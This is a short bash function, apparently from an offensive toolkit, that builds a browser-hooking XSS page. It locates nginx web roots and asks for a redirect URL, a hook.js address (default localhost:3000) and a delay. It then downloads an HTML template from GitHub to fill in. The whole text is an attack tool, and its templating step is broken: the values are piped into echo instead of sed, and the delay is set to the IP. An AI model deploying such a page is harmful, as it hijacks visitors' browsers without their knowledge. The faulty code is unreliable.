gglog "load xss-html gen a xss html"
xss-html(){
  gglog "searching nginx's configi...."
  grep -nr "root" /etc/  | grep nginx
  gglog "set jump to url: default www.google.com [Enter/url] "
  read gourl;
  if [[ $gourl == "" ]]; then
	  gourl="www.google.com";
  fi
  gglog "set hook.js 's ip: default: localhost:3000 [Enter/ip:port]"
  read ip;
  if [[ $ip == "" ]]; then
	  ip="localhost:3000";
  fi
  gglog "set how many sec to delay then jumt real site default: 3 [Enter/int] "
  read sec;
  if [[ $sec == "" ]]; then
	  sec="3";
  fi
  wget -q -O- 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/xss-res/_template.html' |  echo "s/{sec}/$(echo $ip | xargs)/g; s/{gourl}/$(echo $gourl | xargs)/g; s/{ip}/$(echo $ip| xargs)/g "
}
